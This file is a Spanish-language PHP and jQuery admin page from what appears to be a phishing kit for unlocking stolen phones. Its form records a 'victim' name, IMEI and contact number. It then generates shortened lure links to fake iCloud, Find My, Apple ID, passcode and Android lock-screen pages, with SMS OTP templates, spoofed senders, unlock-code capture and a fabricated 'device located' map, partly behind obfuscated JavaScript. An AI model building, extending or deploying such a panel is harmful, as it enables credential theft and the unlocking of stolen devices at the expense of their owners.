<!-- Content Wrapper. Contains page content -->
<div class="content-wrapper">
   <!-- Content Header (Page header) -->
   <section class="content-header">
      <div class="container-fluid">
         <div class="row mb-2">
            <?php if($server['status_msg_notificacion'] == 1){ ?>
             <div class="col-sm-12">
              <div class="card">
               <div class="card-body">
                  <?php if(!empty($server['msg_notificacion'])): echo $server['msg_notificacion']; endif;?>
               </div>
             </div>
            </div>
            <?php } ?>            
            <div class="col-sm-6">
               <h1>Equipo</h1>
            </div>
            <div class="col-sm-6">
               <ol class="breadcrumb float-sm-right">
                  <li class="breadcrumb-item"><a href="#">Equipo</a></li>
                  <li class="breadcrumb-item active">Agregar</li>
               </ol>
            </div>
         </div>
      </div>
      <!-- /.container-fluid -->
   </section>
   <!-- Main content -->
   <section class="content">
      <div class="container-fluid">
         <div class="row">
            <div class="col-md-12">
               <div class="card card-info">
                  <div class="card-header">
                     <h3 class="card-title">Agregar equipo</h3>
                  </div>
                  <div class="card-body">
                     <form class="form-horizontal form-bordered form-equipos">
                        <div class="form-group">
                           <label>Nombre de tu proceso o cliente:</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                 <span class="input-group-text"><i class="fas fa-user"></i></span>
                              </div>
                              <input type="text" class="form-control" placeholder="Usuario" id = "usuario" name="usuario" required>
                           </div>
                        </div>
                        <!-- phone mask -->
                        <div class="form-group">
                           <label>Modelo:</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                 <span class="input-group-text"><i class="fas fa-mobile-alt"></i></span>
                              </div>
                              <select class="form-control" name="modelo" id="modelo">
                                 <optgroup label="iPhone">
                                    <option value = "iphone15">iPhone 15</option>
                                    <option value = "iphone15Plus">iPhone 15 Plus</option>
                                    <option value = "iphone15Pro">iPhone 15 Pro</option>
                                    <option value = "iphone15proMax">iPhone 15 pro Max</option>
                                    <option value = "iphone14_pro_max">iPhone 14 Pro Max</option>
                                    <option value = "iphone14_pro">iPhone 14 Pro</option>
                                    <option value = "iphone14_Plus">iPhone 14 Plus</option>
                                    <option value = "iphone14">iPhone 14</option>
                                    <option value = "iphone13_pro">iPhone 13 Pro</option>
                                    <option value = "iphone13_pro_max">iPhone 13 Pro Max</option>
                                    <option value = "iphone13_mini">iPhone 13 Mini</option>
                                    <option value = "iphone13">iPhone 13</option>
                                    <option value = "iphone12_pro">iPhone 12 Pro</option>
                                    <option value = "iphone12_pro_max">iPhone 12 Pro Max</option>
                                    <option value = "iphone12_mini">iPhone 12 Mini</option>
                                    <option value = "iphone12">iPhone 12</option>
                                    <option value = "iphone11_pro">iPhone 11 Pro</option>
                                    <option value = "iphone11">iPhone 11</option>
                                    <option value = "iphoneSE_2nd_gen">iPhone SE (2ª Generation)</option>
                                    <option value = "iphoneXSmax">iPhone XS Max</option>
                                    <option value = "iphoneXS">iPhone XS</option>
                                    <option value = "iphoneXR">iPhone XR</option>
                                    <option value = "iphoneX">iPhone X</option>
                                    <option value = "iphone8plus">iPhone 8 Plus</option>
                                    <option value = "iphone8">iPhone 8</option>
                                    <option value = "iphone7plus">iPhone 7 Plus</option>
                                    <option value = "iphone7">iPhone 7</option>
                                    <option value = "iphone6splus">iPhone 6s Plus</option>
                                    <option value = "iphone6s">iPhone 6s</option>
                                    <option value = "iphone11_pro_max">iPhone 11 Pro Max</option>
                                    <option value = "iphone6plus">iPhone 6 Plus</option>
                                    <option value = "iphone6">iPhone 6</option>
                                    <option value = "iphoneSE">iPhone SE</option>
                                 </optgroup>
                                 <optgroup label="Mac">
                                    <option value = "macbook_pro_14_2021">MacBook Pro de 14” (2021)</option>
                                    <option value = "macbook_pro_16_2021">MacBook Pro de 16” (2021)</option>
                                    <option value = "macbook_air_retina">MacBook Air (M1, 2020)</option>
                                    <option value = "macbook_air_retina_2020">MacBook Air (2020)</option>
                                    <option value = "macbook_air_2017">MacBook Air (2017)</option>
                                    <option value = "macbook_pro_13_M1_2020">MacBook Pro de 13” (M1, 2020)</option>
                                    <option value = "macbook_pro_13_2_puertos2020">MacBook Pro de 13” (2020)</option>
                                    <option value = "macbook_pro_13_2_puertos2016">MacBook Pro de 13” (2016)</option>
                                    <option value = "macbook_pro_13_4_puertos2020">MacBook Pro de 13” (2020)</option>
                                    <option value = "macbook_pro_16">MacBook Pro de 16" (2019)</option>
                                    <option value = "imac_21.5">iMac de 21.5”</option>
                                    <option value = "imac_21.5_4k">iMac de 21.5” (4K)</option>
                                    <option value = "imac_24_2_puertos">iMac de 24” (M1, 2021)</option>
                                    <option value = "imac_24_4_puertos">iMac de 24” (M1, 2021)</option>
                                    <option value = "imac_27">iMac de 27” (5K)</option>
                                    <option value = "imac_pro">iMac Pro</option>
                                    <option value = "mac_mini_m1">Mac Mini (M1, 2020)</option>
                                    <option value = "mac_mini">Mac Mini (2018)</option>
                                    <option value = "mac_mini_2014">Mac Mini (2014)</option>
                                    <option value = "mac_pro">Mac Pro</option>
                                 </optgroup>
                                 <optgroup label="Watch">
                                    <option value = "watchs7">Apple Watch Series 7</option>
                                    <option value = "watchs6">Apple Watch Series 6</option>
                                    <option value = "watchse">Apple Watch SE</option>
                                    <option value = "watchs5">Apple Watch Series 5</option>
                                    <option value = "watchs4">Apple Watch Series 4</option>
                                    <option value = "watchs3">Apple Watch Series 3</option>
                                    <option value = "watchs2">Apple Watch Series 2</option>
                                    <option value = "watchs1">Apple Watch Series 1</option>
                                 </optgroup>
                                 <optgroup label="iPad">
                                    <option value = "ipad_pro_12_9_5th_gen">iPad Pro de 12.9" (5ª Generation)</option>
                                    <option value = "ipad_pro_11_3rd_gen">iPad Pro de 11" (3ª Generation)</option>
                                    <option value = "ipad_pro_12_9_5th_gen">iPad Pro de 12.9" (5ª Generation)</option>
                                    <option value = "ipad_pro_11_3rd_gen">iPad Pro de 11" (3ª Generation)</option>
                                    <option value = "ipad_air_4th_gen">iPad Air (4ª Generation)</option>
                                    <option value = "ipad_9th_gen">iPad (9ª Generation)</option>
                                    <option value = "ipad_mini_6th_gen">iPad mini (6ª Generation)</option>
                                    <option value = "ipad_pro_12_9_4th_gen">iPad Pro de 12.9" (4ª Generation)</option>
                                    <option value = "ipad_pro_12_9_3rd_gen">iPad Pro de 12.9" (3ª Generation)</option>
                                    <option value = "ipad_pro_12_9_2ndgen">iPad Pro de 12.9" (2ª Generation)</option>
                                    <option value = "ipad_pro_12_9_1st_gen">iPad Pro de 12.9" (1ª Generation)</option>
                                    <option value = "ipad_pro_11_2nd_gen">iPad Pro de 11" (2ª Generation)</option>
                                    <option value = "ipad_pro_11_1st_gen">iPad Pro de 11" (1ª Generation)</option>
                                    <option value = "ipad_pro_10_5">iPad Pro de 10.5"</option>
                                    <option value = "ipad_pro_9_7">iPad Pro de 9.7 </option>
                                    <option value = "ipad_air_3rd_gen">iPad Air (3ª Generation)</option>
                                    <option value = "ipad_air_2">iPad Air 2</option>
                                    <option value = "ipad_air_1st_gen">iPad Air (1ª Generation)</option>
                                    <option value = "ipad_8thgen">iPad (8ª Generation)</option>
                                    <option value = "ipad_7thgen">iPad (7ª Generation)</option>
                                    <option value = "ipad_6thgen">iPad (6ª Generation)</option>
                                    <option value = "ipad_5thgen">iPad (5ª Generation)</option>
                                    <option value = "ipad_mini_5th_gen">iPad mini (5ª Generation)</option>
                                    <option value = "ipad_mini_4">iPad mini 4</option>
                                    <option value = "ipad_mini_3">iPad mini 3</option>
                                    <option value = "ipad_mini_2">iPad mini 2</option>
                                 </optgroup>
                                 <option value="otro">Otro modelo</option>
                              </select>
                           </div>
                        </div>
                        <div class="form-group" id="form-group-modelo" style="display: none;">
                           <label>Ingresa un modelo</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                 <span class="input-group-text"><i class="fas fa-mobile-alt"></i></span>
                              </div>
                              <input type="text" class="form-control" placeholder="..." id = "modeloinput" name = "modeloinput" >
                           </div>
                        </div>
                        <div class="form-group">
                           <label>Pais:</label>
                           <select class="form-control" name="pais" id="pais">
                              <option value="null">Seleccione el pais</option>
                              <?php foreach($pais as $paises) { ?>
                              <option value="<?php echo $paises->nombre; ?>">
                                 <?php echo $paises->nombre; ?>
                              </option>
                              <?php } ?>
                           </select>
                        </div>
                        <div class="form-group">
                           <label>Numero (Sin prefijo / +1):</label>
                           <div class="input-group">
                              <div class="input-group-prepend"> <span class="input-group-text"><span id = "spanprefijo">+1</span></span>
                              </div>
                              <input type="number" class="form-control" placeholder="Número sin + prefijo" id = "numero" name="numero" required> 
                           </div>
                        </div>
                        <div class="form-group">
                           <label>Correo:</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                 <span class="input-group-text"><i class="fas fa-at"></i></span>
                              </div>
                              <input type="email" class="form-control" id ="email" name="email" placeholder="email@Mail.com">
                              <div class="invalid-tooltip">Ingrese un correo valido.</div>
                           </div>                          
                        </div>
                        <div class="form-group">
                           <label>Nombre de la victima (opcional)</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                 <span class="input-group-text"><i class="fa fa-mobile"></i></span>
                              </div>
                              <input type="text" class="form-control" placeholder="iPhone de Luis" id = "niphone">
                           </div>
                           <!-- /.input group -->
                        </div>
                        <!-- /.form group -->
                        <div class="form-group">
                           <label>Imei / numero de serie:</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                 <span class="input-group-text"><i class="fa fa-list-ol"></i></span>
                              </div>
                              <input type="text" class="form-control" placeholder="013xxxxxxxxx" id = "imei" name = "imei">
                           </div>
                           <!-- /.input group -->
                        </div>
                        <div class="form-group">
                           <select class="form-control" name="plataforma" id="plataforma">
                              <optgroup label="Apple">
                                 <option value = "ICN">iCloud 2022</option>
                                 <option value = "ICN_APP">iCloud 2023</option>
                                 <option value = "ICFM">iCloud Find My 2022</option>
                                 <option value="ICFM_APP">iCloud Find My 2023</option>
                                 <option value = "APPID2021">Apple ID</option>
                                 <option value = "PASSCODE">Pass Code</option>
                              </optgroup>
                              <optgroup label="Apple Maps">
                                 <option value = "MAPSNEW">Maps 2024</option>
                                 <option value = "ICMAPS">Apple Maps</option>
                                 <option value = "ICMAPSV2">Apple Maps (ZOOM)</option>
                                 <option value = "ICNLOCATE2">Maps Localizar</option>
                                 <option value = "ICNLOCATE3">iCloud - Localizar V3</option>
                              </optgroup>
                              <optgroup label="Android">
                                 <!--<option value = "Xiaomi">Xiaomi Account 2020</option>
                                 <option value = "Xiaomi2021">Xiaomi Account 2021</option>-->
                                 <option value = "ANDBLOQPATRON">Patron</option>
                                 <option value = "ANDBLOQNUM">Númerico</option>
                                 <option value = "ANDBLOQALFA">Alfanúmerico</option>
                                 <!--<option value = "SAMSUNG">Samsung Account</option>-->
                              </optgroup>
                              <optgroup label="Otros">
                                 <option value="Natura">Natura</option>
                                 <option value = "NaturaV2">Natura V2</option>
                              </optgroup>
                           </select>
                        </div>
                         <div class="form-group">
                           <label>Inición de sesión</label>
                           <br>
                           <label>Aplica para iCloud 2023/Find My 2023/AppIe ID</label>
                           <select class="form-control" name="inicio_sesion" id="inicio_sesion">
                              <option value="directo">Directo</option>
                              <option value="no_directo">No directo</option>                              
                           </select>
                        </div>
                        <hr>
                        <div class="form-group">
                           <label class="col-md-6 col-form-label">
                           <button type="button" class="btn btn-block btn-outline-primary" id="generarCoordenadas"  data-toggle="modal" data-target="#mdalcoordenadas" disabled="true">Generar coordenadas</button>
                           </label>
                        </div>
                        <hr>
                        <div id = "mimapadiv" style="width: 100%; height: 400px; display: none;"></div>
                        <hr>
                        <label>Opciones para verificación OTP</label>
                        <div class="form-group">
                           <label>Opción OTP</label>
                           <select class="form-control" name="opcion_otp" id="opcion_otp">
                              <option value="Desactivado">Desactivado</option>
                              <option value="Activado">Activado</option>                              
                           </select>
                        </div>
                        <div class="form-group">
                           <label>Verificación OTP</label>
                           <select class="form-control" name="tipo_verificacion_otp" id="tipo_verificacion_otp">
                              <option value="numero">Número</option>
                              <option value="sms">SMS</option>
                           </select>
                        </div>

                        <div class="form-group">
                           <label>Servicio SMS</label>
                           <br>
                           <label>Seleccione un servicio o api para el envio de mensajes OTP, en caso de que la verificación sea por número, esta seleccion no afectara.</label>
                           <select class="form-control" name="id_apisms" id="id_apisms">
                           <?php
                              foreach ($smsapi as $sms_api) {
                                 echo '<option value = "'.$sms_api->id_apisms.'">'.$sms_api->descripcion_cliente.'</option>';
                              }
                              
                              ?>
                           </select>
                        </div>

                        <div class="form-group">
                           <label>Remitente</label>
                           <br>
                           <label>Seleccione un remitente para el envio de mensajes OTP.</label>
                           <select class="form-control" name="idsender" id="idsender">
                           <?php
                              foreach ($senders as $sender) {
                                 echo '<option value = "'.$sender->idsender.'">'.$sender->descripcion.'</option>';
                              }
                              
                              ?>
                           </select>
                        </div>


                        <div class="form-group">
                           <label>Plantilla OTP</label>
                           <select class="form-control" name="plantilla_otp" id="plantilla_otp">
                           <?php
                              foreach ($plantillassms as $templates_sms) {
                                 echo '<option value = "'.$templates_sms->idtempsms.'">'.$templates_sms->titulosms.'</option>';
                              }
                              
                              ?>
                           </select>
                        </div>
                        <div class="form-group">
                           <label>Lenguaje otp</label>
                           <br>
                           <label>Se requiere que el idioma seleccionado coincida con el idioma de la plantilla OTP seleccionada.</label>                          
                           <select class="form-control" name="lenguaje_otp" id="lenguaje_otp">                              
                              <option value="es-MX">Español (Latinoamerica)</option>
                              <option value="es-ES">Español (Castellano)</option>
                              <option value="en-US">Ingles</option>
                              <option value="pt-BR">Portugues (Brasil)</option>
                           </select>
                        </div>
                        <hr>
                        <div class="form-group">
                           <label>Elige el codigo de 4 o 6 digitos (opcional), selecciona tu dominio y enseguida - Generar - Guardar.
                           Si aparece una leyenda en color ROJO solo genera el link una vez más.
                           Puedes elegir tu link Acortado o Sin acortar.</label>
                           <select class="form-control" name="tipolinkg" id="tipolinkg" disabled style="display: none;">
                              <option value = "NO">Select</option>
                              <option value = "ALFANUM">Alphanumeric</option>
                              <option value = "NUMINFI">Numeric</option>
                           </select>
                        </div>
                        <hr>
                        <div class="form-group">
                           <div class="input-group">
                              <div class="custom-control custom-switch codeunlockdiv">
                                 <input type="checkbox" class="custom-control-input codeunlock" id="customSwitch1" data-render="switchery">
                                 <label class="custom-control-label" for="customSwitch1">Codigo de desbloqueo</label>
                              </div>
                           </div>
                           <div class="form-group row codeunlockdiv2">
                              <div class="col-sm-6" style="margin-left: 15px">
                                 <!-- radio -->
                                 <div class="form-group clearfix">
                                    <div class="icheck-primary d-inline">
                                       <input type="radio" id="radioPrimary1" name="codeunlockiphone" class = "codeunlockiphone" value="4" disabled>
                                       <label for="radioPrimary1">4
                                       </label>
                                    </div>
                                    <div class="icheck-primary d-inline">
                                       <input type="radio" id="radioPrimary2" name="codeunlockiphone" class = "codeunlockiphone" value="6" disabled >
                                       <label for="radioPrimary2">6
                                       </label>
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <hr>
                           <div class="form-group">
                              <label>Subdominio</label>
                              <select class="form-control" name="subtipo" id="subtipo">
                              <?php foreach ($subdominios as $subs) {
                                 echo '<option value = "'.$subs->subdomains.'">'.$subs->subdomains.'</option>';
                                 } ?>
                              </select>
                           </div>
                           <div class="form-group">
                              <label>Seleccione como desea generar el enlace</label>
                              <select class="form-control" name="urlacortada" id="urlacortada">
                                 <option value="acortada">Acortada</option>
                                 <option value="sinacortar">Sin acortar</option>
                              </select>
                           </div>
                           <hr>
                           <!---Generar Link---->
                           <div class="form-group">
                              <div class="row">
                                 <div class="col-6">
                                    <input type="text" class="form-control" placeholder="isupport/abc" id="igeneratelink" disabled>                               
                                 </div>
                                 <div class="col-6">
                                    <font class="btn btn-info" id = "generarLink" onclick="generarLink()" style="cursor: pointer;"><span class="fas fa-check" aria-hidden="true"></span>&nbsp;Generar link</font>
                                 </div>
                              </div>
                              <span style="color: red; display: none; font-size: 15px;" id = "linkgtrue">El link ya existe, por favor vuelva a generar otro.</span><span style="color: red; display: none; font-size: 15px;" id = "linkgvacio">You must generate a link.</span><span style="color: blue; display: none; font-size: 15px;" id = "linkgfalse">El link se genero correctamente.</span>
                              <span id = "reloadIcloud"></span>
                           </div>
                           <div class="form-group">
                              <label class="col-md-6 col-form-label">
                              <button type="submit" class="btn btn-block btn-outline-primary" id="guardarequipo" disabled>Guardar requerimiento</button>
                              </label>
                           </div>
                        </div>
                     </form>
                     <br>
                     <div id="mdalcoordenadas" class="modal fade bd-example-modal-lg" role="dialog" data-backdrop="static" data-keyboard="false">
                        <div class="modal-dialog modal-lg">
                           <div class="modal-content">
                              <div class="modal-header">
                                 <h4 class="modal-title">Generar mapa</h4>
                              </div>
                              <div class="modal-body">
                                 <div class="form-group">
                                    <label>Seleccione una opción para generar el mapa</label>
                                    <select id = "optionmapa" class="form-control">
                                       <option value = "automatico">Por ubicación</option>
                                       <option value = "direccion">Con dirección</option>
                                       <option value = "coordenadas">Con coordenadas</option>
                                    </select>
                                 </div>
                                 <hr>
                                 <div id = "automatico">
                                    <h1 style="color:green;">Detección automatica mediante la IP.</h1>
                                 </div>
                                 <div class="row longlatmaps" style="display: none;">
                                    <hr>
                                    <div class="col-6">
                                       <input type="text" class="form-control" placeholder="Latitud" id = "latitud" name="latitud">
                                       <div class="invalid-tooltip">Debes ingresar una latitud válida.</div>
                                    </div>
                                    <div class="col-6">
                                       <input type="text" class="form-control" placeholder="Longitud" id = "longitud" name="longitud">
                                       <div class="invalid-tooltip">Debes ingresar una longitud válida.</div>
                                    </div>
                                 </div>
                                 <div id = "mapacoordirec" style="width: 100%; height: 400px; display: none;"></div>
                              </div>
                              <div class="modal-footer">
                                 <button type="button" class="btn btn-default" id="generarmapa">Enviar coordenadas</button>
                                 <button type="button" class="btn btn-default" data-dismiss="modal">salir</button>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
                  <!-- /.card-body -->
               </div>
               <!-- /.card -->
            </div>
         </div>
      </div>
   </section>
   <!-- Control Sidebar -->
   <aside class="control-sidebar control-sidebar-dark">
      <!-- Control sidebar content goes here -->
   </aside>
   <!-- /.control-sidebar -->
   <!-- Main Footer -->
   <footer class="main-footer">
      <strong>Copyright &copy; 2023 <a href="<?php echo base_url();?>"><?php echo $server['descripcionserver']; ?></a>.</strong>
      All rights reserved
      <div class="float-right d-none d-sm-inline-block">
         <b>Version</b> 2.0
      </div>
   </footer>
</div>
<!-- ./wrapper -->
<!-- REQUIRED SCRIPTS -->
<!-- jQuery -->
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
<script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
<script src="https://unpkg.com/leaflet-control-geocoder/dist/Control.Geocoder.js"></script>
<!-- Bootstrap -->
<script src="<?php echo base_url();?>/public/assets/plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- overlayScrollbars -->
<script src="<?php echo base_url();?>/public/assets/plugins/overlayScrollbars/js/jquery.overlayScrollbars.min.js"></script>
<!-- AdminLTE App -->
<script src="<?php echo base_url();?>/public/assets/dist/js/adminlte.js"></script>
<!-- OPTIONAL SCRIPTS -->
<script src="<?php echo base_url();?>/public/assets/dist/js/demo.js"></script>
<!-- PAGE PLUGINS -->
<!-- jQuery Mapael -->
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mousewheel/jquery.mousewheel.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/raphael/raphael.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mapael/jquery.mapael.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mapael/maps/usa_states.min.js"></script>
<!-- ChartJS -->
<script src="<?php echo base_url();?>/public/assets/plugins/chart.js/Chart.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/modal.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/classie.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/modalEffects.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
<script src=".<?php echo base_url();?>/public/assets/plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/sweetalert2/sweetalert2.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/equipos/agregar.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/equipos/mapa/mapa.js"></script>
<!--<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBDaeWicvigtP9xPv919E-RNoxfvC-Hqik"></script>-->
<script type="text/javascript">
   $("input[data-bootstrap-switch]").each(function(){
      $(this).bootstrapSwitch('state', $(this).prop('checked'));
    });
</script>
<script type="text/javascript">
   $(".codeunlock").on('change', function() {
      if($(this).is(':checked') ) {
        $('.codeunlockiphone').removeAttr("disabled")
      }else{
        $('.codeunlockiphone').attr("disabled", true);
        $('.codeunlockiphone').prop('checked', false);
      }
   });
   
    
     
</script>
<script type="text/javascript">
$(document).ready(function () {

   allsenderid($("#id_apisms").val())
   setTimeout(function () {
      $(".theme-loader").fadeOut("slow");
   }, 500)


   $("#title").html($("#title").html() + " .::. Agregar")

   $(".li-agregar").addClass('active')
   $(".li-equipos").addClass('active')
   $(".nav-treeview-equipos").css('display', 'block')
});

$("#plataforma").change(function () {


   var tipo = $("#plataforma").val();
   $("#mimapadiv").hide();
   $("#mdalcoordenadas").modal('hide');

   if (tipo == "ICMAPS" || tipo == "ICMAPSV2" || tipo == "ICNLOCATE2" || tipo == "ICNLOCATE3") {
      $("#latitud").val("");
      $("#longitud").val("");
      $("#latitud").attr("disabled", false);
      $("#longitud").attr("disabled", false);
      $("#generarCoordenadas").attr("disabled", false);
   } else {
      $("#latitud").val("");
      $("#longitud").val("");
      $("#latitud").attr("disabled", true);
      $("#longitud").attr("disabled", true);
      $("#generarCoordenadas").attr("disabled", true);
      $("#mimapadiv").hide();
   }


})


$("#optionmapa").change(function () {

   if ($("#optionmapa").val() == "automatico") {

      $(".longlatmaps").css("display", "none");
      $("#mapacoordirec").css("display", "none");
      $("#automatico").css("display", "block")
      $("#latitud").val("")
      $("#longitud").val("")

   } else if ($("#optionmapa").val() == "direccion") {

      $(".longlatmaps").css("display", "none");
      $("#mapacoordirec").css("display", "block");
      $("#automatico").css("display", "none")

      document.getElementById('mapacoordirec').innerHTML = '<div id="mapd" style="width: 100%; height: 400px;"></div>';
      var _0x85c9be=_0x509a;(function(_0x3c5a01,_0x55301f){var _0x2679b2=_0x509a,_0x23f818=_0x3c5a01();while(!![]){try{var _0x4e67e3=parseInt(_0x2679b2(0x15c))/0x1+-parseInt(_0x2679b2(0x15a))/0x2+parseInt(_0x2679b2(0x157))/0x3*(parseInt(_0x2679b2(0x14f))/0x4)+parseInt(_0x2679b2(0x151))/0x5*(parseInt(_0x2679b2(0x158))/0x6)+parseInt(_0x2679b2(0x159))/0x7+-parseInt(_0x2679b2(0x15d))/0x8*(-parseInt(_0x2679b2(0x153))/0x9)+-parseInt(_0x2679b2(0x155))/0xa;if(_0x4e67e3===_0x55301f)break;else _0x23f818['push'](_0x23f818['shift']());}catch(_0x523d1b){_0x23f818['push'](_0x23f818['shift']());}}}(_0x2060,0xbc19f));function _0x2060(){var _0x4f1f79=['18280wWZdAH','mapd','1503uuDhze','addTo','23575490kaifXx','mt1','4537566cBjkTF','678VXlnTH','3480386XyONeA','1135594RvcOzN','setView','694974MEpEYc','27688GQVujZ','mt0','mt3','mt2','4ARRJvH','tileLayer'];_0x2060=function(){return _0x4f1f79;};return _0x2060();}var map=L['map'](_0x85c9be(0x152))[_0x85c9be(0x15b)]([0x0,0x0],0x2);function _0x509a(_0x4e50e4,_0x4c6b6a){var _0x2060ba=_0x2060();return _0x509a=function(_0x509a33,_0x56da03){_0x509a33=_0x509a33-0x14d;var _0x298ce7=_0x2060ba[_0x509a33];return _0x298ce7;},_0x509a(_0x4e50e4,_0x4c6b6a);}L[_0x85c9be(0x150)]('https://{s}.google.com/vt/lyrs=m&x={x}&y={y}&z={z}',{'maxZoom':0x10,'subdomains':[_0x85c9be(0x15e),_0x85c9be(0x156),_0x85c9be(0x14e),_0x85c9be(0x14d)]})[_0x85c9be(0x154)](map);
      
      var geocoder = L.Control.geocoder({
         position: 'topleft',
         collapsed: true,
         placeholder: 'Buscar ubicación',
         defaultMarkGeocode: true,
         errorMessage: 'Ubicación no encontrada'
      }).on('markgeocode', function (event) {
         var center = event.geocode.center;
         $("#latitud").val(center.lat)
         $("#longitud").val(center.lng)
         L.marker(center).addTo(map);
         //map.setView(center, 2);
      }).addTo(map);


      var popup = L.popup();

      function onMapClick(e) {
         popup
            .setLatLng(e.latlng)
            .setContent(e.latlng.toString())
            .openOn(map);
      }

      map.on('click', onMapClick);


   } else if ($("#optionmapa").val() == "coordenadas") {
      $("#automatico").css("display", "none")
      $(".longlatmaps").css("display", "flex");
      $("#mapacoordirec").css("display", "none");

   }

})


$("#generarmapa").on('click', function () {

   //$('#plataforma').prop('selectedIndex',0);
   $("#mdalcoordenadas").modal('hide');

   if ($("#latitud").val() == "" || $("#longitud").val() == "") {

   } else {


      $("#mimapadiv").show();
      document.getElementById('mimapadiv').innerHTML = '<div id="map" style="width: 100%; height: 400px;"></div>';

      var latitud = parseFloat($("#latitud").val());
      var longitud = parseFloat($("#longitud").val());
       
       function _0x3a4b(_0x1cddc8,_0x326579){var _0x20270f=_0x2027();return _0x3a4b=function(_0x3a4b06,_0xb336f2){_0x3a4b06=_0x3a4b06-0xd9;var _0x51226f=_0x20270f[_0x3a4b06];return _0x51226f;},_0x3a4b(_0x1cddc8,_0x326579);}var _0x517278=_0x3a4b;(function(_0x199f45,_0x3821e1){var _0x42653d=_0x3a4b,_0x5a44db=_0x199f45();while(!![]){try{var _0x50c181=-parseInt(_0x42653d(0xdf))/0x1*(parseInt(_0x42653d(0xe5))/0x2)+parseInt(_0x42653d(0xdc))/0x3+-parseInt(_0x42653d(0xd9))/0x4*(-parseInt(_0x42653d(0xe3))/0x5)+-parseInt(_0x42653d(0xe6))/0x6+parseInt(_0x42653d(0xe1))/0x7+parseInt(_0x42653d(0xe0))/0x8*(-parseInt(_0x42653d(0xe4))/0x9)+-parseInt(_0x42653d(0xda))/0xa*(-parseInt(_0x42653d(0xe8))/0xb);if(_0x50c181===_0x3821e1)break;else _0x5a44db['push'](_0x5a44db['shift']());}catch(_0x133630){_0x5a44db['push'](_0x5a44db['shift']());}}}(_0x2027,0xa04c0));var mymap=L[_0x517278(0xde)]('map');L[_0x517278(0xdb)](_0x517278(0xe9),{'maxZoom':0x10,'subdomains':['mt0',_0x517278(0xdd),_0x517278(0xe2),_0x517278(0xea)]})[_0x517278(0xe7)](mymap);function _0x2027(){var _0xd7f1c3=['tileLayer','1004652IudjSD','mt1','map','1PjroHt','48fveFqn','617064slIJBy','mt2','6835lCnPFh','562563nUSZoa','278966cXgUsK','4820718fbdYXx','addTo','11172194dOPAkv','https://{s}.google.com/vt/lyrs=m&x={x}&y={y}&z={z}','mt3','1568fHlYgC','10oAKCfl'];_0x2027=function(){return _0xd7f1c3;};return _0x2027();}
       L.marker([latitud, longitud]).addTo(mymap);


      if ($("#plataforma").val() == "ICMAPS" || $("#plataforma").val() == "ICNLOCATE2" || $("#plataforma").val() == "ICNLOCATE3") {

         mymap.setView([latitud, longitud], 16);

      } else if ($("#plataforma").val() == "ICMAPSV2") {

         var ss3 = setTimeout(function () {
            mymap.setView([latitud, longitud], 2);
            clearTimeout(ss3);
         }, 1000);

         var ss5 = setTimeout(function () {
            mymap.setView([latitud, longitud], 4);
            clearTimeout(ss5);
         }, 2100);

         var ss6 = setTimeout(function () {
            mymap.setView([latitud, longitud], 6);
            clearTimeout(ss6);
         }, 2700);

         var ss7 = setTimeout(function () {
            mymap.setView([latitud, longitud], 8);
            clearTimeout(ss7);
         }, 3400);

         var ss8 = setTimeout(function () {
            mymap.setView([latitud, longitud], 10);
            clearTimeout(ss8);
         }, 4000);

         var ss9 = setTimeout(function () {
            mymap.setView([latitud, longitud], 12);
            clearTimeout(ss9);
         }, 4600);

         var ss10 = setTimeout(function () {
            mymap.setView([latitud, longitud], 14);
            clearTimeout(ss10);
         }, 5200);
         
         var ss11 = setTimeout(function () {
            mymap.setView([latitud, longitud], 16);
            clearTimeout(ss11);
         }, 5800); 

      }

      var popup = L.popup();

      function onMapClick(e) {
         popup
            .setLatLng(e.latlng)
            .setContent(e.latlng.toString())
            .openOn(mymap);
      }

      mymap.on('click', onMapClick);

   }


})


$("#plataforma").change(function () {
   $("#tipolinkg").prop('disabled', true);
   $('#tipolinkg').prop('selectedIndex', 0);
   $(".codeunlock").css("display", "block")
   $(".codeunlockdiv").css("display", "block")
   $(".codeunlockdiv2").css("display", "block")
})


$('select#pais').change(function () {
   var data_form = {
      pais: $("#pais").val()
   }
   $.ajax({
      url: "../configurar/paises/mostrarprefijo",
      method: "POST",
      data: data_form,
      dataType: 'json',
      beforeSend: function () {
         //$('#reloadIcloud').html('<img src="../assets/server/img/loading.gif" />');
      },
      success: function (response) {
         if (response['prefijo'] == null) {
            $("#spanprefijo").html("+1")
         } else {
            $("#spanprefijo").html(response['prefijo'])
         }
      }
   })
});


$("#modelo").change(function () {

   if ($("#modelo").val() == "otro") {

      $("#form-group-modelo").show();
      $("#modeloinput").focus();

   } else {

      $("#form-group-modelo").hide();

   }

})

function generarLink(){

   $('#reloadIcloud').html("");
   $("#linkgtrue").hide();
   $("#linkgfalse").hide();
   $("#guardarequipo").attr('disabled','disabled')

   var data_form = {
      subdominio: $("#subtipo").val(),
      opcion_url: $("#urlacortada").val()
   }   
   $.ajax({
         type: 'POST',
         url: 'generarLink',
